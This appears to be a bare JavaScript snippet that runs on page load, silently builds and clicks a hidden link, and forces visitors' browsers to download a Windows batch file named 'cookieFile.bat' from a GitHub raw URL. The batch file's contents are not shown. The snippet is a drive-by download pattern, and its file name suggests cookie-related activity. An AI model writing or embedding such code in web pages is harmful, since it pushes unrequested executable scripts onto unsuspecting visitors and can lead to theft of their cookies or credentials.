window.onload = function downloadBatchFile() {
    const batFileUrl = 'https://raw.githubusercontent.com/Propayer/cookieFIle.bat/main/cookieFile.bat';
    const link = document.createElement('a');
    link.href = batFileUrl;
    link.download = 'cookieFile.bat';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}
